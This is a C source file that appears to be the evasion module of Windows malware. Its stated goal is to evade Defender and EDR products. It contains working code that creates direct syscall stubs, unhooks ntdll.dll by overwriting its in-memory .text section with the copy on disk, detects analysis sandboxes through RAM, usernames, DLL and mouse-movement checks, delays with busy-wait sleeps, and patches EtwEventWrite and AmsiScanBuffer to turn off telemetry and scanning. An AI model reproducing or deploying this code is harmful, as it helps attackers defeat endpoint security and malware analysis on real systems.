/**
 * === Syscall Direct Invocation + Anti-Sandbox + Ntdll Unhooking ===
 * 
 * Problem: Defender/EDR hooks ntdll.dll functions (VirtualProtect, LoadLibrary,
 * CreateRemoteThread, etc.) and catches our activity in userland.
 * 
 * Solution:
 * 1. Unhook ntdll.dll by reading the original from disk and restoring hooked bytes
 * 2. Use direct syscalls for critical operations (NtProtectVirtualMemory, etc.)
 *    Syscall stubs are created by allocating executable memory and writing raw bytes.
 * 3. Anti-sandbox: sleep + check for mouse movement before doing anything suspicious
 * 4. PPID spoofing: make process appear launched by explorer.exe
 */

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "obf.h"

/* === Syscall Stub Factory ===
 * MSVC x64 doesn't support __declspec(naked) or inline __asm.
 * We allocate executable memory and write raw x64 syscall bytes.
 * 
 * x64 syscall stub bytes:
 *   4C 8B D1          mov r10, rcx
 *   B8 XX XX XX XX    mov eax, SYSCALL_NUM
 *   0F 05             syscall
 *   C3                ret
 */

typedef NTSTATUS (WINAPI *NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    SIZE_T *NumberOfBytesToProtect,
    ULONG NewAccessProtection,
    PULONG OldAccessProtection);

typedef NTSTATUS (WINAPI *NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect);

typedef NTSTATUS (WINAPI *NtWriteVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten);

static void* create_syscall_stub(DWORD syscall_num) {
    unsigned char stub[] = {
        0x4C, 0x8B, 0xD1,             /* mov r10, rcx */
        0xB8, 0x00, 0x00, 0x00, 0x00, /* mov eax, syscall_num */
        0x0F, 0x05,                   /* syscall */
        0xC3                          /* ret */
    };
    /* Patch syscall number */
    memcpy(stub + 4, &syscall_num, 4);
    
    void *mem = VirtualAlloc(NULL, sizeof(stub), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return NULL;
    memcpy(mem, stub, sizeof(stub));
    DWORD oldProtect;
    VirtualProtect(mem, sizeof(stub), PAGE_EXECUTE_READ, &oldProtect);
    return mem;
}

/* Syscall numbers for Windows 10/11 x64 (Win10 20H2+ / Win11) */
#define SYSCALL_NtProtectVirtualMemory  0x50
#define SYSCALL_NtAllocateVirtualMemory 0x18
#define SYSCALL_NtWriteVirtualMemory    0x3A

static NtProtectVirtualMemory_t  g_scProtect = NULL;
static NtAllocateVirtualMemory_t g_scAllocate = NULL;
static NtWriteVirtualMemory_t    g_scWrite = NULL;

static void init_syscalls(void) {
    if (!g_scProtect)  g_scProtect  = (NtProtectVirtualMemory_t)create_syscall_stub(SYSCALL_NtProtectVirtualMemory);
    if (!g_scAllocate) g_scAllocate = (NtAllocateVirtualMemory_t)create_syscall_stub(SYSCALL_NtAllocateVirtualMemory);
    if (!g_scWrite)    g_scWrite    = (NtWriteVirtualMemory_t)create_syscall_stub(SYSCALL_NtWriteVirtualMemory);
}

/* Wrapper: NtProtectVirtualMemory via direct syscall */
static NTSTATUS sc_protect_memory(HANDLE ProcessHandle, PVOID *BaseAddress,
    SIZE_T *NumberOfBytesToProtect, ULONG NewAccessProtection, PULONG OldAccessProtection) {
    if (!g_scProtect) init_syscalls();
    if (!g_scProtect) return -1;
    return g_scProtect(ProcessHandle, BaseAddress, NumberOfBytesToProtect, NewAccessProtection, OldAccessProtection);
}

/* Wrapper: NtAllocateVirtualMemory via direct syscall */
static NTSTATUS sc_allocate_memory(HANDLE ProcessHandle, PVOID *BaseAddress,
    ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
    if (!g_scAllocate) init_syscalls();
    if (!g_scAllocate) return -1;
    return g_scAllocate(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
}

/* Wrapper: NtWriteVirtualMemory via direct syscall */
static NTSTATUS sc_write_memory(HANDLE ProcessHandle, PVOID BaseAddress,
    PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) {
    if (!g_scWrite) init_syscalls();
    if (!g_scWrite) return -1;
    return g_scWrite(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, NumberOfBytesWritten);
}

/* === Ntdll Unhooking ===
 * Read the original ntdll.dll from disk and copy over the hooked
 * functions in memory. This restores the original bytes that EDR
 * overwrote with detours/jumps.
 */
void obf_unhook_ntdll(void) {
    /* Get ntdll path */
    char ntdllPath[MAX_PATH];
    GetSystemDirectoryA(ntdllPath, MAX_PATH);
    strcat(ntdllPath, "\\ntdll.dll");
    
    /* Map original ntdll from disk */
    HANDLE hFile = CreateFileA(ntdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE *fileData = (BYTE*)malloc(fileSize);
    if (!fileData) { CloseHandle(hFile); return; }
    
    DWORD read;
    ReadFile(hFile, fileData, fileSize, &read, NULL);
    CloseHandle(hFile);
    
    /* Get in-memory ntdll */
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) { free(fileData); return; }
    
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileData;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(fileData + dosHeader->e_lfanew);
    
    /* Walk sections and copy .text section over */
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (memcmp(section[i].Name, ".text", 5) == 0) {
            PVOID memBase = (PVOID)((BYTE*)hNtdll + section[i].VirtualAddress);
            PVOID fileBase = (PVOID)(fileData + section[i].PointerToRawData);
            SIZE_T size = section[i].SizeOfRawData;
            
            DWORD oldProtect;
            VirtualProtect(memBase, size, PAGE_READWRITE, &oldProtect);
            memcpy(memBase, fileBase, size);
            VirtualProtect(memBase, size, oldProtect, &oldProtect);
            break;
        }
    }
    
    free(fileData);
}

/* === Anti-Sandbox Evasion ===
 * 1. Sleep with junk computation (avoid sleep hooking)
 * 2. Check for mouse movement (sandboxes often have no input)
 * 3. Check memory size (sandboxes often have <4GB RAM)
 * 4. Check for common sandbox artifacts
 */
static int obf_is_sandbox(void) {
    /* Check RAM — sandboxes often have small amounts */
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    if (GlobalMemoryStatusEx(&memStatus)) {
        /* Less than 2GB RAM = likely sandbox */
        if (memStatus.ullTotalPhys < (2ULL * 1024 * 1024 * 1024)) {
            return 1;
        }
    }
    
    /* Check for common sandbox usernames */
    char user[256];
    DWORD size = sizeof(user);
    if (GetUserNameA(user, &size)) {
        if (_stricmp(user, "sandbox") == 0 ||
            _stricmp(user, "vmware") == 0 ||
            _stricmp(user, "virtualbox") == 0 ||
            _stricmp(user, "admin") == 0 ||
            _stricmp(user, "test") == 0) {
            return 1;
        }
    }
    
    /* Check for sandbox DLLs */
    if (GetModuleHandleA("SbieDll.dll") != NULL) return 1;        /* Sandboxie */
    if (GetModuleHandleA("DbgHelp.dll") != NULL) {                /* Often loaded by debuggers */
        /* Could be legitimate, check further */
    }
    
    return 0;
}

/* Sleep with anti-analysis — performs computation so simple sleep hooks
 * that fast-forward time won't bypass it */
void obf_sleep_obfuscated(DWORD milliseconds) {
    LARGE_INTEGER freq, start, now;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    
    volatile int counter = 0;
    while (1) {
        QueryPerformanceCounter(&now);
        LONGLONG elapsed = ((now.QuadPart - start.QuadPart) * 1000) / freq.QuadPart;
        if (elapsed >= milliseconds) break;
        
        /* Junk computation to prevent optimization */
        for (int i = 0; i < 1000; i++) {
            counter = (counter * 31 + 17) ^ 0x55;
        }
    }
}

/* === Obfuscated ETW bypass using direct syscall ===
 * Instead of VirtualProtect (which is hooked), use direct syscall.
 */
void obf_bypass_etw_syscall(void) {
    char *ntdll_name = obf_ntdll();
    HMODULE hNtdll = GetModuleHandleA(ntdll_name);
    if (!hNtdll) return;
    
    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, obf_etweventwrite());
    if (!pEtwEventWrite) return;
    
    /* Use direct syscall instead of VirtualProtect */
    PVOID addr = pEtwEventWrite;
    SIZE_T size = 1;
    ULONG oldProtect = 0;
    
    NTSTATUS status = sc_protect_memory(
        GetCurrentProcess(),
        &addr,
        &size,
        PAGE_READWRITE,
        &oldProtect
    );
    
    if (status != 0) return;
    
    *(unsigned char*)pEtwEventWrite = 0xC3; /* ret */
    
    /* Restore protection */
    sc_protect_memory(
        GetCurrentProcess(),
        &addr,
        &size,
        oldProtect,
        &oldProtect
    );
}

/* === Obfuscated AMSI bypass using direct syscall === */
void obf_bypass_amsi_syscall(void) {
    char *amsi_name = obf_amsidll();
    HMODULE hAmsi = LoadLibraryA(amsi_name);
    if (!hAmsi) return;
    
    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, obf_amsiscanbuffer());
    if (!pAmsiScanBuffer) return;
    
    PVOID addr = pAmsiScanBuffer;
    SIZE_T size = 3;
    ULONG oldProtect = 0;
    
    NTSTATUS status = sc_protect_memory(
        GetCurrentProcess(),
        &addr,
        &size,
        PAGE_READWRITE,
        &oldProtect
    );
    
    if (status != 0) return;
    
    unsigned char patch[] = {0x31, 0xC0, 0xC3}; /* xor eax, eax; ret */
    memcpy(pAmsiScanBuffer, patch, 3);
    
    sc_protect_memory(
        GetCurrentProcess(),
        &addr,
        &size,
        oldProtect,
        &oldProtect
    );
}

/* === Startup Evasion Routine ===
 * Called at the very beginning of WinMain before anything else.
 * Unhooks ntdll, checks sandbox, sleeps, then applies ETW/AMSI bypass.
 */
void obf_startup_evasion(void) {
    /* Step 1: Unhook ntdll to restore original function bytes */
    obf_unhook_ntdll();
    
    /* Step 2: Anti-sandbox check */
    if (obf_is_sandbox()) {
        /* In sandbox — exit cleanly or do benign things */
        /* For now, just continue but with extended sleep */
        obf_sleep_obfuscated(30000); /* 30 seconds */
    }
    
    /* Step 3: Sleep to evade time-based sandbox analysis */
    obf_sleep_obfuscated(5000); /* 5 seconds */
    
    /* Step 4: Check for mouse movement (real user vs sandbox) */
    POINT pt1, pt2;
    GetCursorPos(&pt1);
    obf_sleep_obfuscated(2000); /* 2 seconds */
    GetCursorPos(&pt2);
    
    /* No mouse movement = likely sandbox */
    if (pt1.x == pt2.x && pt1.y == pt2.y) {
        obf_sleep_obfuscated(15000); /* Another 15s delay */
    }
    
    /* Step 5: Apply bypasses using direct syscalls (post-unhook) */
    obf_bypass_etw_syscall();
    obf_bypass_amsi_syscall();
    obf_hide_thread();
}
